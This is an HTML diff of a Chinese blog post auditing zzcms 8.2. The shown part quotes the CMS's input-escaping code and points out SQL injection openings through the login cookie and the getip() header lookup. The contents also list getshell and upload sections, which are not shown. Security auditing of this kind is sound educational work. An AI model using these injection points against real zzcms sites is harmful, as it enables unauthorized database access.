@@ -1,388 +1,141 @@
 <!DOCTYPE html>
-
-
-
-  
-
-
-<html class="theme-next mist use-motion" lang>
-<head><meta name="generator" content="Hexo 3.8.0">
-  <meta charset="UTF-8">
+<html lang="en">
+  <head><meta name="generator" content="Hexo 3.8.0"><meta charset="UTF-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<meta name="theme-color" content="#222">
-
-
-
-
-
-
-
 
 
 <meta http-equiv="Cache-Control" content="no-transform">
 <meta http-equiv="Cache-Control" content="no-siteapp">
 
+<meta name="theme-color" content="#f8f5ec">
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
 
+<meta name="description" content="zzcms 8.2 代码审计"><meta name="keywords" content="audit, ll"><link rel="alternate" href="/default" title="ll"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2.11.0">
+<link rel="canonical" href="http://yoursite.com/2019/04/18/zzcms 8.2 代码审计/">
 
+<link rel="stylesheet" type="text/css" href="/lib/fancybox/jquery.fancybox.css"><link rel="stylesheet" type="text/css" href="/lib/nprogress/nprogress.min.css">
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=2.11.0">
 
-
-
-
-
-
-
-
-
-
-
-
-
-  
-  
-  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
-
-
-
-
-  
-  
-  
-  
-
-  
-    
-    
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-    
-    
-    <link href="https://fonts.googleapis.com/css?family=Muli:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
-  
-
-
-
-
-
-
-<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
-
-<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
-
-
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
-
-
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
-
-
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
-
-
-  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
-
-
-
-
-
-  <meta name="keywords" content="audit,">
-
-
-
-
-
-
-
-
-
-
-<meta name="description" content="前言最近实习任务调整成代码审计了，其实原来也复现过一些 cms 的漏洞，但是因为在 mac 上一直不能实现管理多个版本的 php，所以也没有深入去学习代码审计。虽然校赛出的题是搭在 docker 上的，但是懒得用 docker 搭建多个版本 php 了。直到请教了知弦师傅，得到了一篇很好的文章: )有了一个舒服的代码审计的环境，就可以正式开始学习审计了: ) 环境：zzcms 8.2 源码apac">
-<meta name="keywords" content="audit">
-<meta property="og:type" content="article">
-<meta property="og:title" content="zzcms 8.2 代码审计">
-<meta property="og:url" content="http://yoursite.com/2019/04/18/zzcms 8.2 代码审计/index.html">
-<meta property="og:site_name" content="ll">
-<meta property="og:description" content="前言最近实习任务调整成代码审计了，其实原来也复现过一些 cms 的漏洞，但是因为在 mac 上一直不能实现管理多个版本的 php，所以也没有深入去学习代码审计。虽然校赛出的题是搭在 docker 上的，但是懒得用 docker 搭建多个版本 php 了。直到请教了知弦师傅，得到了一篇很好的文章: )有了一个舒服的代码审计的环境，就可以正式开始学习审计了: ) 环境：zzcms 8.2 源码apac">
-<meta property="og:locale" content="default">
-<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/pictures/master/blog/zzcms%208.2/01.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/pictures/master/blog/zzcms%208.2/02.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/pictures/master/blog/zzcms%208.2/03.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/pictures/master/blog/zzcms%208.2/04.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/pictures/master/blog/zzcms%208.2/05.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/pictures/master/blog/zzcms%208.2/06.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/pictures/master/blog/zzcms%208.2/07.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/pictures/master/blog/zzcms%208.2/08.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/pictures/master/blog/zzcms%208.2/09.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/pictures/master/blog/zzcms%208.2/10.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/pictures/master/blog/zzcms%208.2/11.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/pictures/master/blog/zzcms%208.2/12.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/pictures/master/blog/zzcms%208.2/13.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/pictures/master/blog/zzcms%208.2/14.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/pictures/master/blog/zzcms%208.2/15.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/pictures/master/blog/zzcms%208.2/16.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/pictures/master/blog/zzcms%208.2/17.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/pictures/master/blog/zzcms%208.2/18.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/pictures/master/blog/zzcms%208.2/19.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/pictures/master/blog/zzcms%208.2/20.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/pictures/master/blog/zzcms%208.2/21.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/pictures/master/blog/zzcms%208.2/22.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/pictures/master/blog/zzcms%208.2/23.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/pictures/master/blog/zzcms%208.2/24.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/pictures/master/blog/zzcms%208.2/25.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/pictures/master/blog/zzcms%208.2/26.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/pictures/master/blog/zzcms%208.2/27.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/pictures/master/blog/zzcms%208.2/28.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/pictures/master/blog/zzcms%208.2/29.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/pictures/master/blog/zzcms%208.2/30.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/pictures/master/blog/zzcms%208.2/31.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/pictures/master/blog/zzcms%208.2/32.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/pictures/master/blog/zzcms%208.2/33.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/pictures/master/blog/zzcms%208.2/34.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/pictures/master/blog/zzcms%208.2/35.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/pictures/master/blog/zzcms%208.2/36.png">
-<meta property="og:updated_time" content="2019-04-18T14:48:25.620Z">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="zzcms 8.2 代码审计">
-<meta name="twitter:description" content="前言最近实习任务调整成代码审计了，其实原来也复现过一些 cms 的漏洞，但是因为在 mac 上一直不能实现管理多个版本的 php，所以也没有深入去学习代码审计。虽然校赛出的题是搭在 docker 上的，但是懒得用 docker 搭建多个版本 php 了。直到请教了知弦师傅，得到了一篇很好的文章: )有了一个舒服的代码审计的环境，就可以正式开始学习审计了: ) 环境：zzcms 8.2 源码apac">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/LLfam/pictures/master/blog/zzcms%208.2/01.png">
-
-
-
-<script type="text/javascript" id="hexo.configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Mist',
-    version: '5.1.4',
-    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
-    fancybox: true,
-    tabs: true,
-    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
-    duoshuo: {
-      userId: '0',
-      author: 'Author'
-    },
-    algolia: {
-      applicationID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+<script id="baidu_push">
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
     }
-  };
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+<script>
+  window.config = {"leancloud":{"app_id":null,"app_key":null},"toc":true,"fancybox":true,"pjax":true,"latex":false};
 </script>
 
+    <title>zzcms 8.2 代码审计 - ll</title>
+  </head>
 
-
-  <link rel="canonical" href="http://yoursite.com/2019/04/18/zzcms 8.2 代码审计/">
-
-
-
-
-
-  <title>zzcms 8.2 代码审计 | ll</title>
-  
-
-
-
-
-
-
-
-
-</head>
-
-<body itemscope itemtype="http://schema.org/WebPage" lang="default">
-
-  
-  
-    
-  
-
-  <div class="container sidebar-position-left page-post-detail">
-    <div class="headband"></div>
-
-    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-wrapper">
-  <div class="site-meta ">
-    
-
-    <div class="custom-logo-site-title">
-      <a href="/" class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">ll</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
-    </div>
-      
-        <p class="site-subtitle"></p>
-      
+  <body><div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/." class="logo">ll</a>
   </div>
-
-  <div class="site-nav-toggle">
-    <button>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-    </button>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
   </div>
 </div>
 
-<nav class="site-nav">
-  
-
-  
-    <ul id="menu" class="menu">
-      
-        
-        <li class="menu-item menu-item-home">
-          <a href="/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
-            
-            Home
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-tags">
-          <a href="/tags/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
-            
-            Tags
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-archives">
-          <a href="/archives/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
-            
-            Archives
-          </a>
-        </li>
-      
-
-      
-    </ul>
-  
-
-  
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list"><a href="/">
+        <li class="mobile-menu-item">Home
+          </li>
+      </a><a href="/tags/">
+        <li class="mobile-menu-item">Tags
+          </li>
+      </a><a href="/links/">
+        <li class="mobile-menu-item">Links
+          </li>
+      </a><a href="/about/">
+        <li class="mobile-menu-item">About
+          </li>
+      </a></ul>
 </nav>
+<div class="container" id="mobile-panel">
+      <header id="header" class="header"><div class="logo-wrapper">
+  <a href="/." class="logo">ll</a>
+</div>
 
+<nav class="site-navbar"><ul id="menu" class="menu"><li class="menu-item">
+          <a class="menu-item-link" href="/">
+            Home
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/tags/">
+            Tags
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/links/">
+            Links
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/about/">
+            About
+            </a>
+        </li>
+      </ul></nav>
+</header>
 
+      <main id="main" class="main">
+        <div class="content-wrapper">
+          <div id="content" class="content"><article class="post">
+    <header class="post-header">
+      <h1 class="post-title">zzcms 8.2 代码审计
+        </h1>
 
- </div>
+      <div class="post-meta">
+        <span class="post-time">
+          2019-04-18
+        </span></div>
     </header>
 
-    <main id="main" class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          <div id="content" class="content">
-            
-
-  <div id="posts" class="posts-expand">
-    
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/18/zzcms 8.2 代码审计/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="ll">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="ll">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">zzcms 8.2 代码审计</h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-04-18T20:32:10+08:00">
-                2019-04-18
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近实习任务调整成代码审计了，其实原来也复现过一些 cms 的漏洞，但是因为在 mac 上一直不能实现管理多个版本的 php，所以也没有深入去学习代码审计。虽然校赛出的题是搭在 docker 上的，但是<del>懒得</del>用 docker 搭建多个版本 php 了。直到请教了知弦师傅，得到了一篇很好的<a href="https://getgrav.org/blog/macos-mojave-apache-multiple-php-versions" target="_blank" rel="noopener"><strong>文章</strong></a>: )<br>有了一个舒服的代码审计的环境，就可以正式开始学习审计了: )</p>
+    <div class="post-toc" id="post-toc">
+    <h2 class="post-toc-title">Contents</h2>
+    <div class="post-toc-content">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql注入"><span class="toc-text">sql注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#文件删除"><span class="toc-text">文件删除</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xss"><span class="toc-text">xss</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#文件上传"><span class="toc-text">文件上传</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#网站重装"><span class="toc-text">网站重装</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getshell"><span class="toc-text">getshell</span></a></li></ol>
+    </div>
+  </div><div class="post-content"><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近实习任务调整成代码审计了，其实原来也复现过一些 cms 的漏洞，但是因为在 mac 上一直不能实现管理多个版本的 php，所以也没有深入去学习代码审计。虽然校赛出的题是搭在 docker 上的，但是<del>懒得</del>用 docker 搭建多个版本 php 了。直到请教了知弦师傅，得到了一篇很好的<a href="https://getgrav.org/blog/macos-mojave-apache-multiple-php-versions" target="_blank" rel="noopener"><strong>文章</strong></a> )<br>有了一个舒服的代码审计的环境，就可以正式开始学习审计了: )</p>
 <p>环境：<br>zzcms 8.2 <a href="https://github.com/LLfam/cms" target="_blank" rel="noopener"><strong>源码</strong></a><br>apache 2.4.38 + php 7.0.33 + mariadb 10.3.14<br>vscode + xdebug</p>
 <h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p>相关目录：<br>/user：前台注册用户相关的目录。<br>/inc：网站所需包含的各种文件的存放目录。</p>
-<p>/inc 这个目录里面有几个常用的文件。其中<code>/inc/conn.php</code>文件主要负责数据库连接的工作。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /inc/conn.php</span></span><br><span class="line">define(<span class="string">'zzcmsroot'</span>, str_replace(<span class="string">"\\"</span>, <span class="string">'/'</span>, substr(dirname(<span class="keyword">__FILE__</span>), <span class="number">0</span>, <span class="number">-3</span>)));</span><br><span class="line">...</span><br><span class="line"><span class="keyword">include</span>(zzcmsroot.<span class="string">"/inc/function.php"</span>);</span><br><span class="line"><span class="keyword">include</span>(zzcmsroot.<span class="string">"/inc/stopsqlin.php"</span>); </span><br><span class="line">...</span><br><span class="line">$conn=mysqli_connect(sqlhost,sqluser,sqlpwd,sqldb,sqlport) <span class="keyword">or</span> showmsg (<span class="string">"数据库链接失败"</span>); </span><br><span class="line">mysqli_real_query($conn,<span class="string">"SET NAMES 'utf8'"</span>);</span><br><span class="line">mysqli_select_db($conn,sqldb) <span class="keyword">or</span> showmsg (<span class="string">"没有"</span>.sqldb.<span class="string">"这个数据库,或是被管理员断开了链接,请稍后再试"</span>);</span><br></pre></td></tr></table></figure></p>
-<p><code>/inc/conn.php</code>文件开头包含了一些其他文件，主要关注<code>/inc/function.php</code>和<code>/inc/stopsqlin.php</code>这两个文件。在<code>/inc/function.php</code>文件里定义了很多函数。<code>/inc/stopsqlin.php</code>文件主要对 gpc（get、post、cookie）中的数据进行了转义和实体化处理。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /inc/stopsqlin.php </span></span><br><span class="line"><span class="comment">// /inc/stopsqlin.php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">zc_check</span><span class="params">($string)</span></span>&#123; </span><br><span class="line">    <span class="keyword">if</span>(!is_array($string))&#123;</span><br><span class="line">        <span class="keyword">if</span>(get_magic_quotes_gpc())&#123; <span class="comment">// 获取当前magic_quotes_gpc的配置选项的值，防止和addslashes()重复转义 php5.4之后该配置项被移除 </span></span><br><span class="line">            <span class="keyword">return</span> htmlspecialchars(trim($string)); </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> addslashes(htmlspecialchars(trim($string)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span>($string <span class="keyword">as</span> $k =&gt; $v) $string[$k] = zc_check($v);</span><br><span class="line">    <span class="keyword">return</span> $string; </span><br><span class="line">&#125;</span><br><span class="line">	</span><br><span class="line"><span class="keyword">if</span>($_REQUEST)&#123; <span class="comment">// 对request中数据做处理，即gpc中的数据</span></span><br><span class="line">    $_POST =zc_check($_POST);</span><br><span class="line">    $_GET =zc_check($_GET);</span><br><span class="line">    $_COOKIE =zc_check($_COOKIE);</span><br><span class="line">    @extract($_POST);</span><br><span class="line">    @extract($_GET);	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>第一处注入在<code>/user/check.php</code>件里。该文件主要通过 cookie 里的 UserName 和 PassWord 两个字段验证了用户的登录状态，UserName 是前台用户真实的账号名，PassWord 是用户的密码 md5 加密后的值。未登录则返回登录页面。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /user/check.php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_COOKIE[<span class="string">"UserName"</span>]) || !<span class="keyword">isset</span>($_COOKIE[<span class="string">"PassWord"</span>]))&#123; <span class="comment">// cookie中要有 UserName PassWord</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;script&gt;location.href='/user/login.php';&lt;/script&gt;"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure></p>
-<p>在<code>/user/del.php</code>文件的开头包含了和<code>/inc/conn.php</code>和<code>/user/check.php</code>文件。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">"../inc/conn.php"</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"check.php"</span>);</span><br></pre></td></tr></table></figure></p>
-<p>继续看<code>/user/check.php</code>文件。当验证用户登录后，会进入 else 语句，里面一共有5处 sql 语句。看一下第一处：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$username=nostr($_COOKIE[<span class="string">"UserName"</span>]);</span><br><span class="line">$rs=query(<span class="string">"select id,usersf,lastlogintime from zzcms_user where lockuser=0 and username='"</span>.$username.<span class="string">"' and password='"</span>.$_COOKIE[<span class="string">"PassWord"</span>].<span class="string">"'"</span>);</span><br></pre></td></tr></table></figure></p>
-<p>函数 nostr() 定义在<code>/inc/stopsqlin.php</code>文件中，过滤了一些非法字符，如<code>&#39;</code>、<code>/</code>、<code>\</code>等。<br>这句查询里 username 和 password 取自请求头中的 Cookie 字段，但是前面讲了<code>/inc/stopsqlin.php</code>文件中对 $_COOKIE 中的单引号进行了转义，所以无法闭合这句查询的单引号。<br>看一下第二处：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query(<span class="string">"UPDATE zzcms_user SET loginip = '"</span>.getip().<span class="string">"' WHERE username='"</span>.$username.<span class="string">"'"</span>);<span class="comment">//更新最后登录IP</span></span><br></pre></td></tr></table></figure></p>
-<p>看一下 getip() 函数，定义在<code>/inc/function.php</code>中。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /inc/function.php line 100</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getip</span><span class="params">()</span></span>&#123; </span><br><span class="line"><span class="keyword">if</span> (getenv(<span class="string">"HTTP_CLIENT_IP"</span>) &amp;&amp; strcasecmp(getenv(<span class="string">"HTTP_CLIENT_IP"</span>), <span class="string">"unknown"</span>)) </span><br><span class="line">$ip = getenv(<span class="string">"HTTP_CLIENT_IP"</span>); </span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (getenv(<span class="string">"HTTP_X_FORWARDED_FOR"</span>) &amp;&amp; strcasecmp(getenv(<span class="string">"HTTP_X_FORWARDED_FOR"</span>), <span class="string">"unknown"</span>)) </span><br><span class="line">$ip = getenv(<span class="string">"HTTP_X_FORWARDED_FOR"</span>); </span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (getenv(<span class="string">"REMOTE_ADDR"</span>) &amp;&amp; strcasecmp(getenv(<span class="string">"REMOTE_ADDR"</span>), <span class="string">"unknown"</span>)) </span><br><span class="line">$ip = getenv(<span class="string">"REMOTE_ADDR"</span>); </span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>]) &amp;&amp; $_SERVER[<span class="string">'REMOTE_ADDR'</span>] &amp;&amp; strcasecmp($_SERVER[<span class="string">'REMOTE_ADDR'</span>], <span class="string">"unknown"</span>)) </span><br><span class="line">$ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>]; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">$ip = <span class="string">"unknown"</span>; </span><br><span class="line"><span class="keyword">return</span>($ip); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>/inc 这个目录里面有几个常用的文件。其中<code>/inc/conn.php</code>文件主要负责数据库连接的工作。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /inc/conn.php</span></span><br><span class="line">define(<span class="string">'zzcmsroot'</span>, str_replace(<span class="string">"\\"</span>, <span class="string">'/'</span>, substr(dirname(<span class="keyword">__FILE__</span>), <span class="number">0</span>, <span class="number">-3</span>)));</span><br><span class="line">...</span><br><span class="line"><span class="keyword">include</span>(zzcmsroot.<span class="string">"/inc/function.php"</span>);</span><br><span class="line"><span class="keyword">include</span>(zzcmsroot.<span class="string">"/inc/stopsqlin.php"</span>); </span><br><span class="line">...</span><br><span class="line">$conn=mysqli_connect(sqlhost,sqluser,sqlpwd,sqldb,sqlport) <span class="keyword">or</span> showmsg (<span class="string">"数据库链接失败"</span>); </span><br><span class="line">mysqli_real_query($conn,<span class="string">"SET NAMES 'utf8'"</span>);</span><br><span class="line">mysqli_select_db($conn,sqldb) <span class="keyword">or</span> showmsg (<span class="string">"没有"</span>.sqldb.<span class="string">"这个数据库,或是被管理员断开了链接,请稍后再试"</span>);</span><br></pre></td></tr></table></figure>
+
+<p><code>/inc/conn.php</code>文件开头包含了一些其他文件，主要关注<code>/inc/function.php</code>和<code>/inc/stopsqlin.php</code>这两个文件。在<code>/inc/function.php</code>文件里定义了很多函数。<code>/inc/stopsqlin.php</code>文件主要对 gpc（get、post、cookie）中的数据进行了转义和实体化处理。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /inc/stopsqlin.php </span></span><br><span class="line"><span class="comment">// /inc/stopsqlin.php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">zc_check</span><span class="params">($string)</span></span>&#123; </span><br><span class="line">    <span class="keyword">if</span>(!is_array($string))&#123;</span><br><span class="line">        <span class="keyword">if</span>(get_magic_quotes_gpc())&#123; <span class="comment">// 获取当前magic_quotes_gpc的配置选项的值，防止和addslashes()重复转义 php5.4之后该配置项被移除 </span></span><br><span class="line">            <span class="keyword">return</span> htmlspecialchars(trim($string)); </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> addslashes(htmlspecialchars(trim($string)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span>($string <span class="keyword">as</span> $k =&gt; $v) $string[$k] = zc_check($v);</span><br><span class="line">    <span class="keyword">return</span> $string; </span><br><span class="line">&#125;</span><br><span class="line">	</span><br><span class="line"><span class="keyword">if</span>($_REQUEST)&#123; <span class="comment">// 对request中数据做处理，即gpc中的数据</span></span><br><span class="line">    $_POST =zc_check($_POST);</span><br><span class="line">    $_GET =zc_check($_GET);</span><br><span class="line">    $_COOKIE =zc_check($_COOKIE);</span><br><span class="line">    @extract($_POST);</span><br><span class="line">    @extract($_GET);	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>第一处注入在<code>/user/check.php</code>件里。该文件主要通过 cookie 里的 UserName 和 PassWord 两个字段验证了用户的登录状态，UserName 是前台用户真实的账号名，PassWord 是用户的密码 md5 加密后的值。未登录则返回登录页面。</p>
